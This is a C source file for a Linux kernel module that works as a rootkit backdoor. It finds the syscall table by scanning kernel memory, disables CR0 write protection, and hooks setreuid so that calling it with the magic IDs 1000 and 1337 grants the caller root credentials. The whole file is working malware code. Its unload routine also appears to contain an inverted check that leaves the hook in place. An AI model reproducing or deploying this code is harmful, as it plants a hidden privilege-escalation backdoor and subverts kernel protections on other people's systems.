#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/unistd.h>
#include <linux/syscalls.h>

#include <r0mod/global.h>

unsigned long *sct;

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    fm_alert("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if((ruid == 1000) && (euid == 1337))
    {
        fm_alert("[Correct]: You got the correct ids.\n");
        commit_creds(prepare_kernel_cred(0));

        return new_setreuid(0, 0);
    }

    return orig_setreuid(ruid, euid);
}

unsigned long *locate_sct(void)
{
    unsigned long offset;

    for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *))
    {
        unsigned long *sct = (unsigned long *)offset;
        if(sct[__NR_close] == (unsigned long)sys_close)
        {
            fm_alert("Succeeded to get sys_call_table!\n");
            return sct;
        }
    }

    fm_alert("Failed to get sys_call_table!\n");

    return NULL;
}

void disable_page_protection(void)
{
    unsigned long value;
    asm volatile("mov %%cr0, %0" : "=r" (value));

    if(!(value & 0x00010000))
        return;

    asm volatile("mov %0, %%cr0" : : "r" (value & ~0x00010000));
}

void enable_page_protection(void)
{
    unsigned long value;
    asm volatile("mov %%cr0, %0" : "=r" (value));

    if((value & 0x00010000))
        return;

    asm volatile("mov %0, %%cr0" : : "r" (value | 0x00010000));
}

static int __init r0mod_init(void)
{
    fm_alert("Module starting...\n");

    if(!(sct = locate_sct()))
        return -1;

    fm_alert("sys_call_table: %lx\n", (unsigned long)sct);

    disable_page_protection();
    {
        fm_alert("sys_call_table: Hooking setreuid!\n");
        orig_setreuid = (void *)sct[__NR_setreuid];
        sct[__NR_setreuid] = (unsigned long)new_setreuid;
    }
    enable_page_protection();

    return 0;
}

static void __exit r0mod_exit(void)
{
    fm_alert("Module ending...\n");

    if(!sct)
    {
        disable_page_protection();
        {
            fm_alert("sys_call_table: Restoring setreuid!\n");
            sct[__NR_setreuid] = (unsigned long)orig_setreuid;
        }
        enable_page_protection();
    }
}

module_init(r0mod_init);
module_exit(r0mod_exit);
MODULE_LICENSE("GPL");
